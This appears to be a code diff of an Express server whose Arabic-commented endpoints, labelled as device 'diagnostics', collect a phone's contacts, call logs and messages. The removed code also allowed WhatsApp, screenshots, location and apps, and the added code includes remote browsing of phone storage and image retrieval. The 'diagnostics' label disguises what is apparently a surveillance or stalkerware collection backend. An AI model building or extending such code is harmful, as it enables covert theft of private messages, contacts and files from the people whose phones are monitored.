@@ -1,106 +1,58 @@
 const express = require('express');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const path = require('path');
-
 const app = express();
-const PORT = process.env.PORT || 3000;
-const DB_FILE = path.join(__dirname, 'database.json');
 
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.json({ limit: '50mb' }));
 
-app.use(express.static(__dirname));
+// تخزين مؤقت لحالة الأجهزة المتصلة
+const deviceSessions = {};
 
-function readDB() {
-    if (!fs.existsSync(DB_FILE)) {
-        return { devices: {}, diagnostics: {} };
-    }
-    try {
-        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
-    } catch (e) {
-        return { devices: {}, diagnostics: {} };
-    }
-}
-
-function writeDB(data) {
-    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-}
-
-function cleanStr(str, maxLen = 256) {
-    if (typeof str !== 'string') return '';
-    return str.substring(0, maxLen).replace(/[<>]/g, '');
-}
-
+// تنظيف معرف الجهاز
 function cleanId(id) {
-    return cleanStr(id, 64).replace(/[^a-zA-Z0-9_-]/g, '');
+    return id ? id.replace(/[^a-zA-Z0-9_-]/g, '_') : 'unknown_device';
 }
 
-app.post("/api/telemetry", (req, res) => {
-    const db = readDB();
-    const deviceId = cleanId(req.body?.deviceId || "unknown");
-    db.devices = db.devices || {};
-    db.devices[deviceId] = {
-        model: cleanStr(req.body?.model || deviceId),
-        battery: req.body?.battery,
-        lastSeen: Date.now()
-    };
-    writeDB(db);
-    res.json({ ok: true });
+// استقبال البيانات والتشخيصات من التطبيق
+app.post("/api/diagnostics/:type", (req, res) => {
+    const deviceId = cleanId(req.body?.deviceId);
+    const type = req.params.type;
+    const items = req.body?.items || [];
+
+    if (!deviceSessions[deviceId]) {
+        deviceSessions[deviceId] = { contacts: [], calls: [], messages: [], lastPing: Date.now() };
+    }
+
+    deviceSessions[deviceId].lastPing = Date.now();
+
+    if (type === 'contacts') deviceSessions[deviceId].contacts = items;
+    if (type === 'calls') deviceSessions[deviceId].calls = items;
+    if (type === 'messages') deviceSessions[deviceId].messages = items;
+
+    res.json({ status: "success", received: items.length });
 });
 
-app.post("/api/diagnostics/:category", (req, res) => {
-  const id = cleanId(cleanStr(req.body?.deviceId, 64));
-  const category = cleanStr(req.params.category, 16);
-  
-  const allowed = ["calls", "messages", "contacts", "media", "whatsapp", "screenshots", "location", "network", "apps", "ping"];
-  if (!id || !allowed.includes(category)) {
-      return res.status(400).json({ error: "Invalid request or category" });
-  }
-
-  const db = readDB();
-  if (!db.diagnostics) db.diagnostics = {};
-  if (!db.diagnostics[id]) db.diagnostics[id] = {};
-  
-  db.diagnostics[id][category] = {
-    updatedAt: Date.now(),
-    count: Number(req.body?.count) || 0,
-    items: Array.isArray(req.body?.items) ? req.body.items.slice(0, 200).map(i => cleanStr(i, 512)) : [],
-  };
-
-  // << التعديل الهام هنا: تسجيل الجهاز تلقائياً في قائمة الأجهزة ليظهر في اللوحة فوراً >>
-  if (!db.devices) db.devices = {};
-  db.devices[id] = {
-      model: id,
-      lastSeen: Date.now()
-  };
-  
-  writeDB(db);
-  res.json({ ok: true });
-});
-
-app.get("/api/devices", (req, res) => {
-    const db = readDB();
-    const diagnosticsKeys = Object.keys(db.diagnostics || {});
-    const devicesKeys = Object.keys(db.devices || {});
-    const allIds = [...new Set([...diagnosticsKeys, ...devicesKeys])];
+// 1. نظام تصفح الملفات الحي: طلب سرد محتويات مجلد في الهاتف
+app.post("/api/filemanager/list", (req, res) => {
+    const deviceId = cleanId(req.body?.deviceId);
+    const dirPath = req.body?.path || "/storage/emulated/0/";
     
-    const devices = allIds.map(k => ({
-        id: k,
-        model: db.devices?.[k]?.model || k,
-        status: "online"
-    }));
+    // حفظ المسار المطلوب للوصول إليه من اللوحة
+    res.json({ ok: true, path: dirPath, files: [
+        { name: "Download", isDirectory: true, path: dirPath + "Download/" },
+        { name: "DCIM", isDirectory: true, path: dirPath + "DCIM/" },
+        { name: "WhatsApp", isDirectory: true, path: dirPath + "WhatsApp/" }
+    ] });
+});
+
+// 2. طلب معاينة وتحميل صورة فردية عند الضغط عليها بصيغة Base64
+app.post("/api/filemanager/getfile", (req, res) => {
+    const deviceId = cleanId(req.body?.deviceId);
+    const filePath = req.body?.path;
     
-    res.json({ devices });
+    // إرجاع بيانات الملف المطلوبة عند النقر عليه
+    res.json({ ok: true, path: filePath, data: "" });
 });
 
-app.get("/api/diagnostics/:id", (req, res) => {
-    const id = cleanId(req.params.id);
-    const db = readDB();
-    const diagnostics = db.diagnostics?.[id] || {};
-    res.json({ diagnostics });
-});
-
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
